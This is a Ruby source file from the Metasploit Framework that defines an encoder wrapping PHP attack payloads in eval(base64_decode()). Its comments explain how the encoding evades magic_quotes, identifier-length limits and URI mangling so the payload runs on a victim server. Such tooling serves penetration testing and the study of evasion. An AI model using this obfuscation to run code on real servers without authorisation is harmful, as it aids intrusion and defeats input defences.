##
# $Id: base64.rb 6511 2009-04-30 06:11:56Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Encoder

	def initialize
		super(
			'Name'             => 'PHP Base64 encoder',
			'Version'          => '$Revision: 6511 $',
			'Description'      => %q{
				This encoder returns a base64 string encapsulated in
				eval(base64_decode()), increasing the size by a bit more than
				one third.
			},
			'Author'           => 'egypt',
			'License'          => BSD_LICENSE,
			'Arch'             => ARCH_PHP)
	end

	def encode_block(state, buf)
		# PHP escapes quotes by default with magic_quotes_gpc, so we use some
		# tricks to get around using them.
		#
		# The raw, unquoted base64 without the terminating equals works because
		# PHP treats it like a string.  There are, however, a couple of caveats
		# because first, PHP tries to parse the bare string as a constant.
		# Because of this, the string is limited to things that can be
		# identifiers, i.e., things that start with [a-zA-Z] and contain only
		# [a-zA-Z0-9_].  Also, for payloads that encode to more than 998
		# characters, only part of the payload gets unencoded on the victim,
		# presumably due to a limitation in PHP identifier name lengths, so we
		# break the encoded payload into roughly 900-byte chunks.

		b64 = Rex::Text.encode_base64(buf)

		# The '=' or '==' used for padding at the end of the base64 encoded
		# data is unnecessary and can cause parse errors when we use it as a
		# raw string, so strip it off.
		b64.gsub!(/[=\n]+/, '')

		# The first character must not be a non-alpha character or PHP chokes.
		i = 0
		while (b64[i].chr =~ %r{[0-9/+]})
			b64[i] = "chr(#{b64[i]})."
		end

		# Similarly, when we seperate large payloads into chunks to avoid the
		# 998-byte problem mentioned above, we have to make sure that the first
		# character of each chunk is an alpha character.  This simple algorithm
		# will create a broken string in the case of 99 consecutive digits,
		# slashes, and plusses in the base64 encoding, but the likelihood of
		# that is low enough that I don't care.
		i = 900;
		while i < b64.length
			while (b64[i].chr =~ %r{[0-9/+]})
				i += 1
			end
			b64.insert(i,'.')
			i += 900
		end

		# Plus characters ('+') in a uri are converted to spaces, so replace
		# them with something that PHP will turn into a plus.  Slashes cause
		# parse errors on the server side, so do the same for them.
		b64.gsub!("+", ".chr(43).")
		b64.gsub!("/", ".chr(47).")
		# In the case where a plus or slash happened at the end of a chunk,
		# we'll have two dots next to each other, so fix it up.  Note that this
		# is searching for literal dots, not a regex matching any two
		# characters
		b64.gsub!("..", ".")

		
		return "eval(base64_decode(" + b64 + "));"
	end

end
